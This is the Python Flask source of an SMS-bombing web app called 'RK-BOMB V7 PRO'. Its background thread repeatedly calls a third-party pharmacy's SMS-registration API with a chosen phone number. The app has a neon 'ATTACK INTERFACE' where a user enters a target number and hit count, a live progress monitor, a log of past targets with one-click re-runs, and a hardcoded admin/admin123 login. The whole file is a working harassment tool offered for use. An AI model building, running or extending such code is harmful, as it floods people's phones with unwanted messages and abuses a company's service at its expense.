import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- DATABASE SETUP ----------
def get_db():
    conn = sqlite3.connect('rk_v7_xterminator.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- CORE ENGINE ----------
active_sessions = {}

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    api_list = ["https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}"]

    while key in active_sessions:
        curr = active_sessions[key]
        if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': break
        
        if curr['status'] == 'Running':
            # Calculate Live Running Time
            elapsed = datetime.now() - start_dt
            active_sessions[key]['running_time'] = str(elapsed).split('.')[0]
            
            try:
                res = requests.get(random.choice(api_list).format(phone), timeout=8)
                if res.status_code == 200:
                    active_sessions[key]['success'] += 1
                else:
                    active_sessions[key]['fail'] += 1
            except:
                active_sessions[key]['fail'] += 1
            
            active_sessions[key]['total'] += 1
            time.sleep(1) 
        else:
            time.sleep(1)

    # Save finalized data
    stop_dt = datetime.now()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s:
        with get_db() as conn:
            conn.execute("INSERT INTO history (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- STYLED UI WITH FIXED MONITOR ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V7 PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #020202; --card: #0a0a0a; --red: #ff004c; --blue: #00e1ff; --yellow: #ffcc00; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
        
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 10px var(--neon); }

        .container { padding: 25px; max-width: 550px; margin: auto; }

        /* RGB ROTATING FRAME */
        .monitor-frame {
            position: relative;
            background: #000;
            border-radius: 15px;
            padding: 3px;
            overflow: hidden;
            margin-bottom: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
        }
        .monitor-frame::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(var(--neon), var(--blue), var(--red), var(--yellow), var(--neon));
            animation: rotate 4s linear infinite;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .monitor-content {
            position: relative;
            background: var(--card);
            border-radius: 12px;
            padding: 20px;
            z-index: 2;
        }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.03); border: 1px solid #222; padding: 10px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 10px; color: #777; font-weight: bold; margin-bottom: 5px; }
        .info-box b { font-family: 'Orbitron'; font-size: 1.1rem; color: #fff; }

        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 10px; font-family: 'Orbitron'; box-sizing: border-box; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; transition: 0.3s; }
        .btn-main:hover { transform: scale(1.02); box-shadow: 0 0 20px var(--neon); }

        .progress-bar { height: 8px; background: #111; border-radius: 4px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: var(--neon); width: 0%; transition: 0.5s; }
        
        .timer-text { color: var(--yellow); font-family: 'Orbitron'; font-size: 0.9rem; }
    </style>
</head>
<body>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-SYSTEM V7</div>
        <div style="font-size: 13px;">
            <a href="/dashboard" style="color:#fff; text-decoration:none;">DASHBOARD</a> | 
            <a href="/history" style="color:#fff; text-decoration:none; margin-left:10px;">LOGS</a>
        </div>
    </nav>

    <div class="container">[CONTENT]</div>

    <script>
        function playStart() { document.getElementById('snd_start').play(); }

        function updateData() {
            let engine = document.getElementById('live-engine');
            if(!engine) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="monitor-frame">
                        <div class="monitor-content">
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <b style="color:var(--blue); font-family:'Orbitron';">TARGET: ${s.phone}</b>
                                <span class="timer-text">⏱ ${s.running_time || '0:00:00'}</span>
                            </div>
                            <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                            <div class="info-grid">
                                <div class="info-box"><span>SUCCESS</span><b style="color:var(--neon)">${s.success}</b></div>
                                <div class="info-box"><span>FAILED</span><b style="color:var(--red)">${s.fail}</b></div>
                                <div class="info-box"><span>PROGRESS</span><b>${s.total}/${s.limit}</b></div>
                                <div class="info-box"><span>START AT</span><b style="font-size:0.8rem;">${s.start_time}</b></div>
                            </div>
                            <button class="btn-main" style="margin-top:15px; padding:8px; font-size:11px; background:var(--red); color:#fff;" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE MISSION</button>
                        </div>
                    </div>`;
                }
                engine.innerHTML = html;
            });
        }
        setInterval(updateData, 2000);
    </script>
</body>
</html>
'''

# ---------- ROUTES ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3>ENCRYPTED LOGIN</h3><form method="POST"><input name="u" placeholder="Admin ID"><input name="p" type="password" placeholder="Pass-Key"><button class="btn-main">DECRYPT & ENTER</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="monitor-frame">
            <div class="monitor-content">
                <h3 style="margin:0 0 15px 0; font-family:'Orbitron'; color:var(--neon);">🚀 ATTACK INTERFACE</h3>
                <form action="/api/start" onsubmit="playStart()">
                    <input name="num" placeholder="Phone Number" required>
                    <input name="amt" type="number" placeholder="Hit Count" required>
                    <button class="btn-main">INITIALIZE ATTACK</button>
                </form>
            </div>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT phone, SUM(success) as ok, COUNT(*) as sessions FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 style="font-family:Orbitron;">📂 ARCHIVED DATA</h3>'
    for l in logs:
        html += f'<div class="monitor-frame"><div class="monitor-content" style="display:flex; justify-content:space-between; align-items:center;"><div><b>{l['phone']}</b><br><small>Hits: {l['ok']}</small></div><button class="btn-main" style="width:auto; padding:5px 15px; font-size:10px;" onclick="location.href=\'/api/start?num={l['phone']}&amt=100\'">RE-RUN</button></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

# ---------- API ----------
@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = datetime.now()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00'
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    return jsonify({k: v for k, v in active_sessions.items() if k.startswith(u)})

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
